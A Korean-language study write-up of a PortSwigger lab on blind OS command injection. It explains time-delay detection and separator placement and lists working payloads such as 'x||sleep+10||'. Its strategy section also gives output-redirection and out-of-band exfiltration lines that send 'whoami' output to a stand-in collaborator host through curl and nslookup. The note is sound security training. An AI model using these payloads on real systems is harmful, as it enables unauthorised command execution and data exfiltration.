# Lab: Blind OS command injection with time delays

## 개요

- **난이도**: Practitioner
- **주제**: OS Command Injection — Blind / 시간 지연 탐지 / 구분자 양쪽 처리
- **링크**: https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays

## 목표

응답에 출력이 없는 Blind 환경에서 `sleep` 명령으로 시간 지연을 유발해 OS Command Injection 취약점이 존재함을 확인한다.

## Blind OS Command Injection

```
[즉시 출력 (001 랩)]
  명령 실행 결과가 응답 body 에 그대로 반환
  → 어떤 명령이든 결과를 바로 읽을 수 있음

[Blind (이번 랩)]
  명령은 실행되지만 결과가 응답에 없음
  → 실행 여부 자체를 간접적으로 확인해야 함
  → 시간 지연(sleep)이 가장 간단한 탐지 방법
```

## 핵심 학습 — 구분자 양쪽 처리

### 문제 상황

서버 내부 명령 구조 (추정):
```bash
process_feedback {name} {email} {subject} {message}
#                              ↑
#                       email 파라미터가 중간에 위치
```

주입 위치가 명령의 **중간**에 있으므로, 주입 구문 뒤에 원래 명령의 나머지 인자가 이어진다.

```bash
# 구분자를 앞에만 붙인 경우 (실패)
email=||sleep+10
→ process_feedback ... ||sleep 10 {subject} {message}
                                   ↑
                           sleep 뒤에 나머지 인자가 붙어 오류 발생 (500)

# 구분자를 앞뒤에 붙인 경우 (성공)
email=||sleep+10||
→ process_feedback ... ||sleep 10|| {subject} {message}
                                  ↑
                            뒤 인자가 || 로 분리됨 → sleep 성공 시 뒤 실행 안 됨
```

### SQL Injection 과의 유사성

```
[SQL Injection — 뒤 쿼리 무력화]
  원래:  SELECT * FROM users WHERE id='{input}'
  공격:  ' OR 1=1 --
  결과:  SELECT * FROM users WHERE id='' OR 1=1 --'
                                              ↑
                                     -- 로 뒤 내용 주석 처리

[OS Command Injection — 뒤 명령 무력화]
  원래:  process {name} {email} {subject}
  공격:  ||sleep 10||
  결과:  process {name} ||sleep 10|| {subject}
                                   ↑
                              || 로 뒤 인자 분리
                              sleep 성공 → 뒤 실행 안 됨 (|| 조건 불충족)

공통 원칙:
  주입 구문이 명령/쿼리 중간에 삽입되므로
  뒤에 오는 원래 내용을 무력화해야 오류 없이 실행됨
```

## 공격 페이로드

```
email=x||sleep+10||
```

URL 인코딩:
```
email=x%7c%7csleep+10%7c%7c
```

서버에서 실행:
```bash
process_feedback ... x||sleep 10|| {subject} {message}
#  x → 명령 없으므로 실패
#  || → 앞이 실패했으니 sleep 실행
#  sleep 10 → 10초 대기 ← 취약점 확인!
#  || → sleep 성공(exit 0)이므로 뒤 실행 안 함
#  {subject} {message} → 무시됨
```

응답: 10초 후 반환 → Blind OS Command Injection 존재 확인

## 구분자별 양쪽 처리 패턴

```bash
# || 사용 시 (앞 명령 실패 조건)
||sleep+10||

# ; 사용 시 (무조건 실행)
;sleep+10;

# & 사용 시 (백그라운드 실행)
%26sleep+10%26

# 개행 사용 시
%0asleep+10%0a
```

## 구분자 선택 기준

```
[; 또는 \n]
  앞 명령 성공/실패와 무관하게 실행
  가장 범용적

[||]
  앞 명령이 실패해야 실행됨
  앞 인자가 비어있거나 잘못된 경우 적합

[&&]
  앞 명령이 성공해야 실행됨
  앞 인자가 정상적으로 처리되는 경우 적합

[|]
  앞 명령 출력을 뒤 명령 입력으로 전달
  sleep 에는 의미 없음 (입력 불필요)
  출력 기반 명령에 유용
```

## Blind 취약점 탐지 전략

```
1단계 — 시간 지연으로 존재 확인 (이번 랩)
  sleep 10 → 10초 지연 확인 → 취약점 존재

2단계 — 데이터 추출 방법 선택
  출력 리다이렉션:  whoami > /var/www/html/output.txt
                   → https://TARGET/output.txt 접근
  OOB:             curl http://COLLABORATOR/$(whoami)
                   nslookup $(whoami).COLLABORATOR
```

## 핵심 정리

- Blind OS Command Injection 은 출력 없이 시간 지연(`sleep`)으로 취약점 존재를 확인한다.
- 주입 위치가 명령 **중간**에 있으면 구분자를 **앞뒤 양쪽**에 붙여야 뒤에 오는 인자가 오류를 일으키지 않는다.
- SQL Injection 에서 `--` 로 뒤 쿼리를 주석 처리하는 것과 같은 원리: **주입 구문이 중간에 삽입되므로 뒤 내용을 무력화해야 한다**.
- `||sleep+10||` 패턴이 실용적: 앞 명령 실패 시 sleep 실행, sleep 성공 시 뒤 인자 무시.

## 배운 점

### 구분자 양쪽 처리 요약

```
잘못된 패턴 (500 오류):
  ||sleep+10          ← 뒤 인자가 sleep 명령에 붙어 오류

올바른 패턴:
  ||sleep+10||        ← 뒤 인자를 || 로 분리해 무시
  ;sleep+10;          ← 뒤 인자를 ; 로 분리해 별도 실행 (무해한 경우)
  ;sleep+10%23        ← # 으로 뒤 인자 주석 처리 (bash 에서 동작)
```
